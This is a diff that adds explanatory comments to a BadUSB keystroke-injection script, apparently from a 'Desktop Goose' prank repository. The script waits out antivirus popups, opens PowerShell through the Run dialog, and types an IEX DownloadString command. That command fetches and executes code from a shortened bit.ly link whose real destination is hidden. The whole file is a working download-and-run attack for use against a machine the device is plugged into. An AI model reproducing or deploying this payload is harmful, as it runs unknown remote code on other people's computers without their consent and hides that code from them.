@@ -1,8 +1,14 @@
+REM This program is from http://github.com/Jf0-2/Desktop-Goose-BAD-USB
+
+REM Wait 5 seconds incase antivirus programs have a popup window because of the new device
 DELAY 5000
+REM Open powersehll
 GUI r
 DELAY 200
 STRING powershell
 ENTER
+# Wait for powershell to open (may take a while on first startup)
 DELAY 3000
+# Download and run the 'main.ps1' file
 STRING IEX(New-Object Net.WebClient).DownloadString('http://bit.ly/3xI7L')
 ENTER
